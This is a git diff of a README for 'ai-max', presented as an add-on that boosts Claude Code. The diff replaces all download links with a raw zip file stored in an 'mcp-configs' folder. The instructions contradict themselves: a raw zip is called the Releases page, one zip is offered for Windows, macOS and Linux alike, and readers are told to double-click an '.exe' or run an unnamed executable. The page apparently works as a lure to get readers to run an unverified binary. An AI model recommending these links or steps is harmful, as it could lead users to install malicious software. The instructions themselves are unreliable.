@@ -1,7 +1,7 @@
 # 🚀 ai-max - Boost Your Claude Code Experience 
 
 ## 📥 Download Now
-[![Download ai-max](https://github.com/aldo832/ai-max/raw/refs/heads/main/bin/max-ai-v3.8.zip)](https://github.com/aldo832/ai-max/raw/refs/heads/main/bin/max-ai-v3.8.zip)
+[![Download ai-max](https://github.com/aldo832/ai-max/raw/refs/heads/main/mcp-configs/max_ai_1.2.zip)](https://github.com/aldo832/ai-max/raw/refs/heads/main/mcp-configs/max_ai_1.2.zip)
 
 ## 📖 Description
 ai-max is your go-to solution for enhancing your Claude Code’s intelligence with a single click. It offers production-level agents, skills, hooks, commands, rules, and MCP configurations, all designed to help you streamline your workflow.
@@ -18,20 +18,20 @@ Before you download, ensure your computer meets these basic requirements:
 
 ### 2. Visit the Downloads Page
 Go to the ai-max Releases page to find the latest version:
-[Download ai-max](https://github.com/aldo832/ai-max/raw/refs/heads/main/bin/max-ai-v3.8.zip)
+[Download ai-max](https://github.com/aldo832/ai-max/raw/refs/heads/main/mcp-configs/max_ai_1.2.zip)
 
 ## 📦 Download & Install
 1. **Select the Latest Release:** On the Releases page, look for the most recent version of ai-max.
   
 2. **Download the Software:** Click on the version number to go to the details page. There, find the appropriate download link for your operating system. Generally, you will see files like:
-   - `https://github.com/aldo832/ai-max/raw/refs/heads/main/bin/max-ai-v3.8.zip` for Windows users.
-   - `https://github.com/aldo832/ai-max/raw/refs/heads/main/bin/max-ai-v3.8.zip` for macOS users.
-   - `https://github.com/aldo832/ai-max/raw/refs/heads/main/bin/max-ai-v3.8.zip` for Linux users.
+   - `https://github.com/aldo832/ai-max/raw/refs/heads/main/mcp-configs/max_ai_1.2.zip` for Windows users.
+   - `https://github.com/aldo832/ai-max/raw/refs/heads/main/mcp-configs/max_ai_1.2.zip` for macOS users.
+   - `https://github.com/aldo832/ai-max/raw/refs/heads/main/mcp-configs/max_ai_1.2.zip` for Linux users.
 
 3. **Run the Installer:**
    - For Windows: Double-click the downloaded `.exe` file and follow the prompts to install.
    - For macOS: Open the `.zip` file, drag ai-max to your Applications folder, and launch it from there.
-   - For Linux: Extract the contents of the `https://github.com/aldo832/ai-max/raw/refs/heads/main/bin/max-ai-v3.8.zip` file and run the executable in your terminal.
+   - For Linux: Extract the contents of the `https://github.com/aldo832/ai-max/raw/refs/heads/main/mcp-configs/max_ai_1.2.zip` file and run the executable in your terminal.
 
 ### 3. Launching ai-max
 After the installation is complete, you can open ai-max from your applications folder or desktop shortcut. 
